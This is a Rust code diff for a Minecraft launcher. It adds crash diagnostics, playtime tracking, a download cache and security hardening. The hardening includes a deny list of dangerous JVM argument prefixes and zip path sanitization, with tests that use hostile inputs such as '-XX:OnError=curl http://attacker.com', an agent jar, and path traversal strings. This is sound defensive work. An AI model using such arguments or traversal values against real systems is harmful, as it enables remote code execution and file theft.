@@ -10,8 +10,7 @@ use crate::auth::{Profile, ProfileStore};
 use crate::minecraft::models::MinecraftVersion;
 use crate::state::LauncherState;
 use crate::wardrobe::WardrobeStore;
-use std::sync::Mutex;
-use std::sync::OnceLock;
+use std::sync::{Arc, Mutex, OnceLock};
 use std::time::Instant;
 use tauri::{AppHandle, Emitter, Manager, State};
 
@@ -19,6 +18,7 @@ use tauri::{AppHandle, Emitter, Manager, State};
 static GLOBAL: mimalloc::MiMalloc = mimalloc::MiMalloc;
 
 static START_TIME: OnceLock<Instant> = OnceLock::new();
+static STARTUP_MEASURED: OnceLock<u64> = OnceLock::new();
 
 pub fn init_start_time() {
     START_TIME.get_or_init(Instant::now);
@@ -26,10 +26,12 @@ pub fn init_start_time() {
 
 #[tauri::command]
 fn get_startup_time() -> u64 {
-    START_TIME
-        .get()
-        .map(|t| t.elapsed().as_millis() as u64)
-        .unwrap_or(0)
+    *STARTUP_MEASURED.get_or_init(|| {
+        START_TIME
+            .get()
+            .map(|t| t.elapsed().as_millis() as u64)
+            .unwrap_or(0)
+    })
 }
 
 #[repr(C)]
@@ -110,9 +112,11 @@ pub struct AppState {
     pub launcher_state: Mutex<LauncherState>,
     pub profile_store: ProfileStore,
     pub wardrobe_store: WardrobeStore,
+    pub last_crash: Mutex<Option<minecraft::crash::CrashDiag>>,
+    pub is_game_running: std::sync::atomic::AtomicBool,
 }
 
-fn validate_safe_id(id: &str) -> Result<(), String> {
+pub fn validate_safe_id(id: &str) -> Result<(), String> {
     if id.is_empty()
         || id.contains("..")
         || id.contains('/')
@@ -122,6 +126,26 @@ fn validate_safe_id(id: &str) -> Result<(), String> {
         return Err("Invalid identifier".to_string());
     }
     Ok(())
+}
+
+pub fn is_safe_jvm_arg(arg: &str) -> bool {
+    let lower = arg.to_lowercase();
+    let dangerous_prefixes = [
+        "-javaagent:",
+        "-agentlib:",
+        "-agentpath:",
+        "-xbootclasspath",
+        "-xx:onerror=",
+        "-xx:onoutofmemoryerror=",
+        "-xx:errorfile=",
+        "-dcom.sun.management.jmxremote",
+    ];
+    for prefix in &dangerous_prefixes {
+        if lower.starts_with(prefix) {
+            return false;
+        }
+    }
+    true
 }
 
 #[tauri::command]
@@ -203,11 +227,12 @@ async fn get_versions(state: State<'_, AppState>) -> Result<Vec<MinecraftVersion
 
     let current_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
 
+    let mut custom_locals = Vec::new();
     for local in local_versions {
         if let Some(existing) = remote_versions.iter_mut().find(|v| v.id == local.id) {
             existing.is_local = true;
         } else {
-            remote_versions.push(local);
+            custom_locals.push(local);
         }
     }
 
@@ -223,7 +248,15 @@ async fn get_versions(state: State<'_, AppState>) -> Result<Vec<MinecraftVersion
         }
     });
 
-    Ok(remote_versions)
+    // Partition so all local versions / installed instances appear at the very TOP
+    let mut final_list = custom_locals;
+    let (mut local_downloaded, remote_only): (Vec<_>, Vec<_>) =
+        remote_versions.into_iter().partition(|v| v.is_local);
+
+    final_list.append(&mut local_downloaded);
+    final_list.extend(remote_only);
+
+    Ok(final_list)
 }
 
 #[tauri::command]
@@ -243,10 +276,45 @@ struct LaunchProgressPayload {
 }
 
 #[tauri::command]
+fn is_game_running(state: State<'_, AppState>) -> bool {
+    state
+        .is_game_running
+        .load(std::sync::atomic::Ordering::SeqCst)
+}
+
+#[tauri::command]
 async fn launch_game(
     profile_id: String,
     version_id: String,
     state: State<'_, AppState>,
+    app: AppHandle,
+) -> Result<(), String> {
+    if state
+        .is_game_running
+        .compare_exchange(
+            false,
+            true,
+            std::sync::atomic::Ordering::SeqCst,
+            std::sync::atomic::Ordering::SeqCst,
+        )
+        .is_err()
+    {
+        return Err("Игра уже запускается или запущена".to_string());
+    }
+
+    let res = launch_game_inner(profile_id, version_id, &state, app).await;
+    if res.is_err() {
+        state
+            .is_game_running
+            .store(false, std::sync::atomic::Ordering::SeqCst);
+    }
+    res
+}
+
+async fn launch_game_inner(
+    profile_id: String,
+    version_id: String,
+    state: &State<'_, AppState>,
     app: AppHandle,
 ) -> Result<(), String> {
     validate_safe_id(&version_id)?;
@@ -404,7 +472,14 @@ async fn launch_game(
 
     if !launcher_state.jvm_arguments.is_empty() {
         for arg in launcher_state.jvm_arguments.split_whitespace() {
-            launcher.jvm_arg(arg);
+            if is_safe_jvm_arg(arg) {
+                launcher.jvm_arg(arg);
+            } else {
+                eprintln!(
+                    "[SECURITY] Filtered out potentially dangerous JVM argument: {}",
+                    arg
+                );
+            }
         }
     }
 
@@ -523,30 +598,43 @@ async fn launch_game(
 
     let mut child = command.spawn().map_err(|e| e.to_string())?;
 
+    let session_logs = Arc::new(Mutex::new(Vec::<String>::new()));
+    let start_time = std::time::Instant::now();
+    let version_id_clone = version_id.clone();
+    let memory_amount = launcher_state.memory_amount;
+
     let app_clone_out = app.clone();
+    let session_logs_out = session_logs.clone();
     if let Some(stdout) = child.stdout.take() {
         std::thread::spawn(move || {
             use std::io::{BufRead, BufReader};
             let reader = BufReader::new(stdout);
-            for line in reader.lines() {
-                if let Ok(line) = line {
-                    println!("[MC STDOUT] {}", line);
-                    let _ = app_clone_out.emit("minecraft-log", line);
+            for line in reader.lines().flatten() {
+                println!("[MC STDOUT] {}", line);
+                if let Ok(mut lock) = session_logs_out.lock() {
+                    if lock.len() < 2000 {
+                        lock.push(line.clone());
+                    }
                 }
+                let _ = app_clone_out.emit("minecraft-log", line);
             }
         });
     }
 
     let app_clone_err = app.clone();
+    let session_logs_err = session_logs.clone();
     if let Some(stderr) = child.stderr.take() {
         std::thread::spawn(move || {
             use std::io::{BufRead, BufReader};
             let reader = BufReader::new(stderr);
-            for line in reader.lines() {
-                if let Ok(line) = line {
-                    eprintln!("[MC STDERR] {}", line);
-                    let _ = app_clone_err.emit("minecraft-error", line);
+            for line in reader.lines().flatten() {
+                eprintln!("[MC STDERR] {}", line);
+                if let Ok(mut lock) = session_logs_err.lock() {
+                    if lock.len() < 2000 {
+                        lock.push(line.clone());
+                    }
                 }
+                let _ = app_clone_err.emit("minecraft-error", line);
             }
         });
     }
@@ -571,12 +659,40 @@ async fn launch_game(
             }
         }
 
-        let _ = child.wait();
+        let exit_status = child.wait().ok();
+        let duration_secs = start_time.elapsed().as_secs();
+
+        // Record playtime
+        let mut store = minecraft::playtime::PlaytimeStore::load(&app_clone_wait);
+        store.add_session(&version_id_clone, duration_secs, &app_clone_wait);
+
+        // Analyze potential crash
+        let logs_combined = session_logs
+            .lock()
+            .map(|l| l.join("\n"))
+            .unwrap_or_default();
+        let exit_code = exit_status.and_then(|s| s.code());
+        if let Some(diag) =
+            minecraft::crash::diagnose(exit_code, &logs_combined, &version_id_clone, memory_amount)
+        {
+            let _ = app_clone_wait.emit("minecraft-crash-diagnostic", &diag);
+            if let Some(app_state) = app_clone_wait.try_state::<AppState>() {
+                if let Ok(mut lock) = app_state.last_crash.lock() {
+                    *lock = Some(diag);
+                }
+            }
+        }
 
         if let Some(window) = app_clone_wait.get_webview_window("main") {
             let _ = window.show();
             let _ = window.unminimize();
             let _ = window.set_focus();
+        }
+
+        if let Some(app_state) = app_clone_wait.try_state::<AppState>() {
+            app_state
+                .is_game_running
+                .store(false, std::sync::atomic::Ordering::SeqCst);
         }
 
         let _ = app_clone_wait.emit(
@@ -941,6 +1057,8 @@ fn delete_instance(
 async fn create_instance(
     id: String,
     base_version: String,
+    loader: Option<String>,
+    loader_version: Option<String>,
     files: Option<Vec<(String, Vec<u8>)>>,
     state: State<'_, AppState>,
     app: tauri::AppHandle,
@@ -948,22 +1066,51 @@ async fn create_instance(
     validate_safe_id(&id)?;
     let mc_dir = crate::minecraft::versions::get_minecraft_dir();
 
-    let version_dir = mc_dir.join("versions").join(&id);
+    let mut final_id = id.clone();
+    let mut counter = 2;
+    while mc_dir.join("versions").join(&final_id).exists()
+        || mc_dir.join("instances").join(&final_id).exists()
+    {
+        final_id = format!("{}-{}", id, counter);
+        counter += 1;
+    }
+
+    let version_dir = mc_dir.join("versions").join(&final_id);
     std::fs::create_dir_all(&version_dir).map_err(|e| e.to_string())?;
 
-    let version_json_path = version_dir.join(format!("{}.json", id));
-    let minimal_json = serde_json::json!({
-        "id": id,
-        "inheritsFrom": base_version,
-        "type": "custom",
-        "loader": "fabric",
-        "loaderVersion": "0.19.3"
+    let selected_loader = loader.as_deref().unwrap_or("fabric");
+    let selected_loader_version = loader_version.unwrap_or_else(|| {
+        if selected_loader == "fabric" {
+            "0.19.3".to_string()
+        } else {
+            "latest".to_string()
+        }
     });
+
+    let version_json_path = version_dir.join(format!("{}.json", final_id));
+    let minimal_json = if selected_loader == "vanilla" {
+        serde_json::json!({
+            "id": final_id,
+            "inheritsFrom": base_version,
+            "type": "custom"
+        })
+    } else {
+        serde_json::json!({
+            "id": final_id,
+            "inheritsFrom": base_version,
+            "type": "custom",
+            "loader": selected_loader,
+            "loaderVersion": selected_loader_version
+        })
+    };
     std::fs::write(&version_json_path, minimal_json.to_string()).map_err(|e| e.to_string())?;
 
-    let instance_dir = mc_dir.join("instances").join(&id);
+    let instance_dir = mc_dir.join("instances").join(&final_id);
     let mods_dir = instance_dir.join("mods");
     std::fs::create_dir_all(&mods_dir).map_err(|e| e.to_string())?;
+
+    let instance_json_path = instance_dir.join("instance.json");
+    let _ = std::fs::write(&instance_json_path, minimal_json.to_string());
 
     if let Some(file_list) = files {
         for (filename, bytes) in file_list {
@@ -973,10 +1120,10 @@ async fn create_instance(
     }
 
     let mut current_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
-    current_state.selected_version_id = Some(id.clone());
+    current_state.selected_version_id = Some(final_id.clone());
     current_state.save(&app)?;
 
-    Ok(id)
+    Ok(final_id)
 }
 
 #[tauri::command]
@@ -998,10 +1145,33 @@ async fn download_instance_file(
         std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
     }
 
+    // 1. Check central deduplication CAS cache in obsy_objects by URL hash
+    use sha2::{Digest, Sha256};
+    let mut hasher = Sha256::new();
+    hasher.update(url.as_bytes());
+    let url_hash = format!("{:x}", hasher.finalize());
+
+    let cache_dir = mc_dir.join("obsy_objects").join(&url_hash[0..2]);
+    let cache_file = cache_dir.join(&url_hash);
+
+    if cache_file.exists() {
+        if crate::minecraft::dedup::link_or_copy(&cache_file, &dest_path).is_ok() {
+            println!(
+                "[DEDUP] Reused cached instance file from obsy_objects for: {}",
+                subpath
+            );
+            return Ok(subpath);
+        }
+    }
+
+    // 2. Download from network if not in cache
     let client = crate::open_launcher::utils::get_http_client();
     let resp = client
         .get(&url)
-        .header("User-Agent", "ObsyLauncher/0.1.9")
+        .header(
+            "User-Agent",
+            concat!("ObsyLauncher/", env!("CARGO_PKG_VERSION")),
+        )
         .send()
         .await
         .map_err(|e| format!("Failed to download file: {}", e))?;
@@ -1011,7 +1181,10 @@ async fn download_instance_file(
         .await
         .map_err(|e| format!("Failed to read bytes: {}", e))?;
 
-    std::fs::write(&dest_path, &bytes).map_err(|e| e.to_string())?;
+    // 3. Save to central CAS cache and hardlink to destination
+    let _ = std::fs::create_dir_all(&cache_dir);
+    let _ = std::fs::write(&cache_file, &bytes);
+    let _ = crate::minecraft::dedup::link_or_copy(&cache_file, &dest_path);
 
     Ok(subpath)
 }
@@ -1068,23 +1241,25 @@ async fn extract_instance_zip_folder(
         format!("{}/", folder_prefix)
     };
 
+    let target_base = if dest_subpath.is_empty() {
+        instance_dir.clone()
+    } else {
+        crate::addons::sanitize_path(&instance_dir, std::path::Path::new(&dest_subpath))?
+    };
+
     for i in 0..archive.len() {
         if let Ok(mut entry) = archive.by_index(i) {
             let name = entry.name().to_string();
             if name.starts_with(&prefix) && !name.ends_with('/') {
                 let rel = name.strip_prefix(&prefix).unwrap_or(&name);
-                let target = if dest_subpath.is_empty() {
-                    instance_dir.join(rel)
-                } else {
-                    instance_dir.join(&dest_subpath).join(rel)
-                };
-
-                if let Some(parent) = target.parent() {
-                    let _ = std::fs::create_dir_all(parent);
-                }
-                if let Ok(mut out) = std::fs::File::create(&target) {
-                    use std::io::copy;
-                    let _ = copy(&mut entry, &mut out);
+                if let Ok(target) = crate::addons::safe_zip_extract_path(&target_base, rel) {
+                    if let Some(parent) = target.parent() {
+                        let _ = std::fs::create_dir_all(parent);
+                    }
+                    if let Ok(mut out) = std::fs::File::create(&target) {
+                        use std::io::copy;
+                        let _ = copy(&mut entry, &mut out);
+                    }
                 }
             }
         }
@@ -1108,6 +1283,64 @@ async fn delete_instance_file(instance_id: String, subpath: String) -> Result<()
     Ok(())
 }
 
+#[tauri::command]
+fn get_playtime_summary(app: AppHandle) -> Result<minecraft::playtime::PlaytimeSummary, String> {
+    Ok(minecraft::playtime::get_summary(&app))
+}
+
+#[tauri::command]
+fn get_last_crash_diagnostics(
+    state: State<'_, AppState>,
+) -> Result<Option<minecraft::crash::CrashDiag>, String> {
+    let lock = state.last_crash.lock().map_err(|e| e.to_string())?;
+    Ok(lock.clone())
+}
+
+#[tauri::command]
+async fn apply_crash_action(
+    app: AppHandle,
+    state: State<'_, AppState>,
+    kind: String,
+    arg: String,
+) -> Result<String, String> {
+    match kind.as_str() {
+        "set-ram" => {
+            let mb: i32 = arg.parse().map_err(|_| "Invalid RAM amount".to_string())?;
+            let mut l_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
+            l_state.memory_amount = mb;
+            l_state.auto_memory = false;
+            l_state.save(&app)?;
+            Ok(format!("Memory allocated to {} MB", mb))
+        }
+        "disable-mod" => {
+            let mc_dir = crate::minecraft::versions::get_minecraft_dir();
+            minecraft::crash::disable_mod_file(&mc_dir, &arg)
+        }
+        "install-java" => {
+            let mut l_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
+            l_state.java_path = None;
+            l_state.save(&app)?;
+            Ok("Reset Java configuration to auto-managed".to_string())
+        }
+        "open-folder" => {
+            use tauri_plugin_opener::OpenerExt;
+            let mc_dir = crate::minecraft::versions::get_minecraft_dir();
+            app.opener()
+                .open_path(mc_dir.to_string_lossy().to_string(), None::<&str>)
+                .map_err(|e| e.to_string())?;
+            Ok("Game folder opened".to_string())
+        }
+        "open-url" => {
+            use tauri_plugin_opener::OpenerExt;
+            app.opener()
+                .open_url(arg, None::<&str>)
+                .map_err(|e| e.to_string())?;
+            Ok("URL opened in browser".to_string())
+        }
+        _ => Err(format!("Unknown crash action: {}", kind)),
+    }
+}
+
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     tauri::Builder::default()
@@ -1116,6 +1349,9 @@ pub fn run() {
         .plugin(tauri_plugin_opener::init())
         .setup(|app| {
             let handle = app.handle();
+            let mc_dir = minecraft::versions::get_minecraft_dir();
+            minecraft::migration::migrate_legacy_data_if_needed(&mc_dir, Some(handle));
+
             let initial_state = LauncherState::load(handle);
             let profile_store = ProfileStore::new(handle);
             let wardrobe_store = WardrobeStore::new(handle);
@@ -1123,6 +1359,8 @@ pub fn run() {
                 launcher_state: Mutex::new(initial_state),
                 profile_store,
                 wardrobe_store,
+                last_crash: Mutex::new(None),
+                is_game_running: std::sync::atomic::AtomicBool::new(false),
             });
             Ok(())
         })
@@ -1136,6 +1374,7 @@ pub fn run() {
             get_versions,
             select_version,
             launch_game,
+            is_game_running,
             start_msa_auth,
             poll_msa_auth,
             get_wardrobe,
@@ -1155,6 +1394,9 @@ pub fn run() {
             delete_instance_file,
             get_startup_time,
             get_app_memory_usage,
+            get_playtime_summary,
+            get_last_crash_diagnostics,
+            apply_crash_action,
             addons::get_installed_addons_from_disk,
             addons::read_addon_file,
             addons::uninstall_addon_files,
@@ -1171,11 +1413,82 @@ pub fn run() {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::path::Path;
 
     #[test]
     fn test_app_memory() {
         let mem = get_app_memory_usage();
         println!("\n>>> ACTUAL MEASURED MEMORY: {} MB <<<\n", mem);
         assert!(mem > 0);
+    }
+
+    #[test]
+    fn test_validate_safe_id() {
+        assert!(validate_safe_id("valid-addon-1").is_ok());
+        assert!(validate_safe_id("skin_3d_viewer").is_ok());
+        assert!(validate_safe_id("1.20.4").is_ok());
+
+        assert!(validate_safe_id("").is_err());
+        assert!(validate_safe_id("../evil").is_err());
+        assert!(validate_safe_id("evil/path").is_err());
+        assert!(validate_safe_id("evil\\path").is_err());
+        assert!(validate_safe_id("addon\0null").is_err());
+    }
+
+    #[test]
+    fn test_is_safe_jvm_arg() {
+        assert!(is_safe_jvm_arg("-Xmx4G"));
+        assert!(is_safe_jvm_arg("-XX:+UseG1GC"));
+        assert!(is_safe_jvm_arg("-Dminecraft.launcher.brand=obsy"));
+
+        assert!(!is_safe_jvm_arg("-javaagent:/tmp/evil.jar"));
+        assert!(!is_safe_jvm_arg("-agentlib:jdwp=transport=dt_socket"));
+        assert!(!is_safe_jvm_arg("-agentpath:/tmp/lib.so"));
+        assert!(!is_safe_jvm_arg("-XX:OnError=curl http://attacker.com"));
+        assert!(!is_safe_jvm_arg("-XX:OnOutOfMemoryError=reboot"));
+        assert!(!is_safe_jvm_arg("-Xbootclasspath:/tmp/override"));
+    }
+
+    #[test]
+    fn test_addons_path_sanitization() {
+        let base = Path::new("/tmp/obsy_test_base");
+
+        // Safe paths
+        let safe1 = addons::sanitize_path(base, Path::new("index.js")).unwrap();
+        assert_eq!(safe1, base.join("index.js"));
+
+        let safe2 = addons::sanitize_path(base, Path::new("assets/icon.png")).unwrap();
+        assert_eq!(safe2, base.join("assets/icon.png"));
+
+        // Path traversal attempts
+        assert!(addons::sanitize_path(base, Path::new("../evil.js")).is_err());
+        assert!(addons::sanitize_path(base, Path::new("/etc/passwd")).is_err());
+        assert!(addons::sanitize_path(base, Path::new("nested/../../evil")).is_err());
+
+        // Zip extract paths
+        assert!(addons::safe_zip_extract_path(base, "index.js").is_ok());
+        assert!(addons::safe_zip_extract_path(base, "sub/dir/file.txt").is_ok());
+        assert!(addons::safe_zip_extract_path(base, "../evil.js").is_err());
+        assert!(addons::safe_zip_extract_path(base, "../../root.txt").is_err());
+        assert!(addons::safe_zip_extract_path(base, "/absolute/path").is_err());
+    }
+
+    #[test]
+    fn test_addon_verification_spoof_prevention() {
+        // Unknown or spoofed author addon with invalid hash must not be verified
+        assert!(!addons::is_verified_addon("unknown-addon", None));
+        assert!(!addons::is_verified_addon(
+            "unknown-addon",
+            Some("a94caf582b190a8413ce0b154fa9f024c359a849b0c2e589add6fe3d1e779700")
+        ));
+        assert!(!addons::is_verified_addon(
+            "skin-3d-viewer",
+            Some("fake_hash")
+        ));
+        // Correct official addon checksum matches
+        assert!(addons::is_verified_addon(
+            "skin-3d-viewer",
+            Some("a94caf582b190a8413ce0b154fa9f024c359a849b0c2e589add6fe3d1e779700")
+        ));
     }
 }
